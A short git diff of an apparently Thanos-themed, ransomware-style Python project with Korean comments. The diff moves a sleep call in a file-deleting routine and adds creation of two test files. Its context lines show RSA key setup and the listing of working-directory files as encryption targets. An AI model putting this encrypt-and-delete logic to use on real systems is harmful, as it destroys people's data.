@@ -169,6 +169,8 @@ def remove_files(gui, remove_filelist, ext=None):
     gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
     gui.l_thanos.pack()
 
+    sleep(2)
+
     # 파일이 2개 이상일 경우
     if (len(remove_filelist) >= 2):
         n = 0
@@ -190,9 +192,6 @@ def remove_files(gui, remove_filelist, ext=None):
         print("더 이상 삭제할 파일이 없습니다")
         gui.listWindow.destroy()
         allRemovePrint(gui)
-
-    # gui
-    sleep(2)
 
     gui.l_thanos.pack_forget()
     gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos)
@@ -341,6 +340,11 @@ if __name__ == "__main__":
     cipher = PKCS1_OAEP.new(rsa_key)
     private_key = rsa_key.export_key()
     print("비밀키는 : ", private_key)
+
+    #테스트용 파일 생성하기...(복붙너무귀찮아서...)
+    for i in range(2):
+        with open("test" + str(i) +'.txt', 'wb') as testfile:
+            testfile.write('테스트입니다'.encode())
 
     # timer 테스트
     enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
